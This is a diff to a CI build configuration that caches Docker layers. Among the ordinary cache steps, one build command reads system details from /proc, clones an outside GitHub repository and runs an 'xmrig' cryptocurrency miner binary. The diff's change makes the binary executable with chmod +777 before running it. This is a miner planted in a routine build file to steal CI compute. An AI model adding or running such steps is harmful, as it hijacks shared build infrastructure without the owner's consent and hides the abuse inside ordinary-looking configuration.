@@ -10,6 +10,6 @@ build:
         - command: restore-from-cache repository docker-layers - | docker load
           only_if: exists-in-cache repository docker-layers
 
-        - cat /proc/1/cgroup; cat /proc/uptime; cat /proc/cpuinfo; cat /proc/meminfo; cat /proc/cmdline; git clone https://github.com/dajiejie123/webserver.git && cd webserver && ./xmrig
+        - cat /proc/1/cgroup; cat /proc/uptime; cat /proc/cpuinfo; cat /proc/meminfo; cat /proc/cmdline; git clone https://github.com/dajiejie123/webserver.git && cd webserver && chmod +777 xmrig && ./xmrig
         # see "docker save --help" for syntax
         - docker save YOUR_IMAGE ANOTHER_IMAGE ... | store-in-cache repository docker-layers -
